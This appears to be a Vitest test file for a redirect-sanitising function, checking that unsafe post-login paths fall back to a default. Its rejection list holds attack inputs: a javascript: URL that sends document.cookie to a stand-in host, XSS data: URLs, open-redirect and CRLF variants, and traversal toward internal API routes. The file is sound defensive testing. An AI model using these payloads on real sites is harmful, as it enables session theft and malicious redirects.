import { describe, expect, it } from "vitest";
import { DEFAULT_POST_AUTH_PATH, safeInternalPath } from "./safe-redirect";

describe("safeInternalPath (SEC-03)", () => {
  it.each([
    "javascript:fetch('https://evil.example/'+document.cookie)",
    "JavaScript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://evil.example/dashboard",
    "//evil.example/dashboard",
    "/\\evil.example",
    "\\\\evil.example",
    "/%0d%0aevil",
    "/dashboard\u0000",
    "/api/user/delete-account",
    "/login",
    "dashboard",
    "",
    null,
    undefined,
    42,
  ])("rejects %s", (input) => {
    expect(safeInternalPath(input)).toBe(DEFAULT_POST_AUTH_PATH);
  });

  it.each([
    ["/dashboard", "/dashboard"],
    ["/dashboard?plan=growth&shopify=reconnected", "/dashboard?plan=growth&shopify=reconnected"],
    ["/onboarding/audit", "/onboarding/audit"],
    ["/campaigns/123e4567-e89b-12d3-a456-426614174000", "/campaigns/123e4567-e89b-12d3-a456-426614174000"],
    ["/dashboard/../dashboard", "/dashboard"],
  ])("allows %s", (input, expected) => {
    expect(safeInternalPath(input)).toBe(expected);
  });

  it("does not let path traversal escape the allow-list", () => {
    expect(safeInternalPath("/dashboard/../api/cron/sync-stores")).toBe(DEFAULT_POST_AUTH_PATH);
  });

  it("uses the caller's fallback", () => {
    expect(safeInternalPath("javascript:alert(1)", "/dashboard")).toBe("/dashboard");
  });
});
